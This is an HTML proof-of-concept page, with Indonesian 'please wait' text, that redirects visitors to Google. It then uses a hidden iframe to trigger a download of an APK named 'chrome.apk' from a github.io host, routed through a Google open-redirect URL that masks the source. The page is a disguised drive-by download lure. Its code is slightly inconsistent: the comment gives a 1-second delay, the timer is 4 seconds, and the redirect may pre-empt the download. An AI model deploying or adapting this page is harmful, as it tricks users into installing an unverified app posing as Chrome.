<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect & Download PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
        }
    </style>
</head>
<body>

    <h2>Memuat halaman...</h2>
    <p>Mohon tunggu sebentar.</p>

    <script>
        // 1. Redirect utama ke Google.com terlebih dahulu
        window.location.href = "https://www.google.com";

        // 2. Memicu dialog download file APK setelah jeda singkat (misal 1 detik)
        setTimeout(function() {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
            document.body.appendChild(iframe);
        }, 4000);
    </script>

</body>
</html>
